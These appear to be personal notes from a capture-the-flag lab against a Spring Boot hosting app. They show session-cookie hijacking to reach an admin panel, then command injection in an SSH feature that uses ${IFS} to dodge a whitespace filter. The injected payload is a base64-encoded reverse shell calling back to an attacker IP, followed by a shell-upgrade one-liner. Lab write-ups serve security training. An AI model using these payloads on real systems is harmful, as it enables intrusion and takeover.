Errorpages
If dir not found: 404

Whitelabel Error Page
This application has no explicit mapping for /error, so you are seeing this as a fallback.

There was an unexpected error (type=None, status=999).


Researched "Whitelabel Error Page"
Its from Springboot a Framwork for Java
https://stackoverflow.com/questions/61029340/spring-security-redirects-to-page-with-status-code-999

it seems that statuscode 999 is somehow linked to the login
curl -X POST http://cozyhosting.htb/error \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: JSESSIONID=DBEF37A92CC770C28D150DFA352B9278"

This reseted my cookie but i got the same response
{"timestamp":"2025-07-04T12:49:12.019+00:00","status":999,"error":"None"}

List of bootspring endpoint
https://docs.spring.io/spring-boot/reference/actuator/endpoints.html added them to > endpoint.txt

The unauthorized is my cookie, i replace mine with the one from kanderson
-> going to /admin im logged im as him


Enumaration of Adminpannel
kanderson got a notification:
    Keep your hosts patched!
    3 hosts require your attention.

There a overview of which hosts are patch and which not.
Theres also a function: Include host into automatic patching
    Please note
    For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.

Connection settings need Hostname and Username
i tried: 
suspiciousmcnulty & kanderson -> Host from list above
cozyhosting.htb & kanderson
127.0.0.1 & kanderson

in burp i saw this tool connects to 
request POST /executessh
response GET /admin?error=ssh:%20Could%20not%20resolve%20hostname%20hostname:%20Temporary%20failure%20in%20name%20resolution 4

this looks like a script that just executs SSH this might be exploitable
host=10.10.14.94&username=kanderson$(id)
kandersonuid=1001(app)

the app filters for whitespaces in the username, so i used this to get a shell
host=10.10.14.94&username=kanderson%60echo%24%7BIFS%7DYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC45NC80NDQ0IDA%2BJjEK%7Cbase64%24%7BIFS%7D-d%7Cbash%60

upgrade shell: python3 -c 'import pty; pty.spawn("/bin/bash")'
